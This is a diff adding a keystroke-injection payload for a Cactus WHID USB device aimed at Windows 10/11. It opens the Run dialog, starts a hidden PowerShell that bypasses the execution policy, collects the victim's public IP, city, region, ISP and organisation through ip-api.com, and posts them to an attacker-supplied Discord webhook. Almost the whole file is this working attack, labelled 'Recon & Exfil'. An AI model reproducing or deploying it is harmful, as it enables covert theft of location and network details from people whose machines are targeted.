@@ -1,0 +1,10 @@
+REM === Cactus WHID Payload: Public IP and Geolocation ===
+REM Target: Windows 10/11
+REM Category: Recon & Exfil
+REM Description: Grabs public IP, city, region, ISP via ip-api.com and sends to Discord
+REM Replace: DISCORD_WEBHOOK_URL_HERE with your webhook URL
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -NoP -W Hidden -Exec Bypass -C "$g=Invoke-RestMethod 'http://ip-api.com/json';$msg=\"IP: $($g.query) | City: $($g.city) | Region: $($g.regionName) | ISP: $($g.isp) | Org: $($g.org)\";$body=@{content=$msg}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body"
+ENTER
